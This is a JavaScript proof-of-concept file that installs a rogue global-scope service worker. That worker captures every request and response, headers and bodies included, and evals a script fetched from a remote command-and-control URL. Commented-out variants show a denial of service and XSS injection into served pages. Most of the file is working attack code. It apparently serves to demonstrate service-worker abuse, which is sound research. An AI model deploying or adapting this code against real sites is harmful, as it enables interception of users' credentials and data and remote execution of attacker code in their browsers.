let sw_global_text = `
self.addEventListener('fetch', event => {
	let res = await fetch(event.request);
	let res_body = await res.text();

	// malicious worker can extract data from request/response
	console.log('--------------------- Captured request from client ----------------------');
	console.log('Request headers:');
	for(let h of event.request.headers)
		console.log(h[0].padEnd(30, ' ') + ' : ' + h[1]);
	console.log('Request body:');
	console.log(await event.request.text());
	console.log('--------------------- Captured response from server ---------------------');
	console.log('Response headers:');
	for(let h of res.headers)
		console.log(h[0].padEnd(30, ' ') + ' : ' + h[1]);
	console.log('Response body:');
	console.log(res_body);

	// malicious worker can retrieve and execute commands from a C&C server
	eval((await fetch('https://arw9234.github.io/static-payloads/command.js')).text());	

	// malicious worker could cause a denial-of-service for the victim
	// event.respondWith(new Response('<h1>Site unavailable</h1>', { status: 500, statusText: 'Internal server error' }));

	// malicious worker can modify response and execute standard XSS payloads that interact with the DOM by injecting scripts in response
	/* let body = res_body.split('</head>', 2);
	   event.respondWith(new Response(
		body[0] + '<script>alert(document.domain)</script></head>' + body[1],
		{ status: res.status, statusText: res.statusText, headers: res.headers})); */	

	event.respondWith(res);
});`;

self.addEventListener('fetch', function(event) {
	if(event.request.url.endsWith('sw_global.js'))
		event.respondWith(new Response(sw_global_text, { status: 200, statusText: 'OK', headers: { 'Content-Type': 'text/javascript',  'service-worker-allowed': '/' } }));
	else
		event.respondWith(fetch(event.request));
});
